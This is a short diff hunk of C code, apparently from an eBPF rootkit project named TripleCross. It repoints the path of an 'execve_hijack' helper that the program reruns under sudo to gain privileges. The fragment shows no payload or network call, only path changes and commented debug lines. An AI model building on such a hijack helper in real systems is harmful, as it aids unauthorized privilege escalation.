@@ -272,7 +272,8 @@ int main(int argc, char* argv[], char *envp[]){
         //We do not have privileges, but we do want them. Let's rerun the program now.
         char* args[argc+3]; 
         args[0] = "sudo";
-        args[1] = "/home/osboxes/TFG/src/helpers/execve_hijack";
+        //args[1] = "/home/osboxes/TFG/src/helpers/execve_hijack";
+        args[1] = "/home/u22/myebpf/TripleCross/src/helpers/execve_hijack";
         //printf("execve ARGS%i: %s\n", 0, args[0]);
         //printf("execve ARGS%i: %s\n", 1, args[1]);
         for(int ii=0; ii<argc; ii++){
